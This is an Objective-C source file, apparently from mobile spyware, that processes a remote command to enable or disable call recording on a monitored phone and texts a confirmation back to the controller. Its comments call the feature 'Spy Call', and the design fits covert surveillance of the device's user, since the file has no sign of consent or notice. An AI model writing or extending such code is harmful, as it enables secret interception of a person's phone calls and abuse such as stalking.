//
//  EnableCallRecordProcessor.m
//  RCM
//
//  Created by Makara Khloth on 11/26/15.
//
//

#import "EnableCallRecordProcessor.h"
#import "PrefEventsCapture.h"
#import "Preference.h"

@interface EnableCallRecordProcessor (PrivateAPI)
- (void) enableCallRecord;
- (BOOL) isValidFlag;
- (void) enableCallRecordException;
- (void) sendReplySMS;
@end

@implementation EnableCallRecordProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableCallRecordProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (EnableCallRecordProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"EnableCallRecordProcessor--->initWithRemoteCommandData");
    if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
    }
    return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableCallRecordProcessor
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"EnableCallRecordProcessor--->doProcessingCommand");
    if ([self isValidFlag])	[self enableCallRecord];
    else [self enableCallRecordException];
}


#pragma mark EnableCallRecordProcessor PrivateAPI Methods

/**
 - Method name: enableCallRecord
 - Purpose:This method is used to process Enable Spy Call
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) enableCallRecord {
    DLog (@"EnableCallRecordProcessor--->enableCallRecord");
    NSUInteger flagValue=[[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
    id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
    PrefEventsCapture *prefEvents = (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
    [prefEvents setMEnableCallRecording:flagValue];
    [prefManager savePreferenceAndNotifyChange:prefEvents];
    [self sendReplySMS];
}

/**
 - Method name: isValidFlag
 - Purpose:This method is used to validate the Arguments
 - Argument list and description:
 - Return description:isValidArguments (BOOL)
 */

- (BOOL) isValidFlag {
    DLog (@"EnableCallRecordProcessor--->isValidFlag")
    BOOL isValid=NO;
    NSArray *args=[mRemoteCmdData mArguments];
    if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];
    return isValid;
}

/**
 - Method name: enableCallRecordException
 - Purpose:This method is invoked when enable Spycall process is failed.
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) enableCallRecordException {
    DLog (@"EnableCallRecordProcessor--->enableCallRecordException")
    FxException* exception = [FxException exceptionWithName:@"enableOneCallException" andReason:@"Enable OneCall record error"];
    [exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
    
    DLog (@"EnableCallRecordProcessor--->sendReplySMS")
    NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                        andErrorCode:_SUCCESS_];
    NSString *enableCallRecordMessage=NSLocalizedString (@"kEnableOneCallRecord", @"");
    
    if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1)
        enableCallRecordMessage=[enableCallRecordMessage stringByAppendingString:NSLocalizedString(@"kEnabled", @"")];
    else
        enableCallRecordMessage=[enableCallRecordMessage stringByAppendingString:NSLocalizedString(@"kDisabled", @"")];
    
    enableCallRecordMessage=[messageFormat stringByAppendingString:enableCallRecordMessage];
    
    //===========================================================================================================================
    
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:enableCallRecordMessage];
    
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:enableCallRecordMessage];
    }
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
    [super dealloc];
}

@end
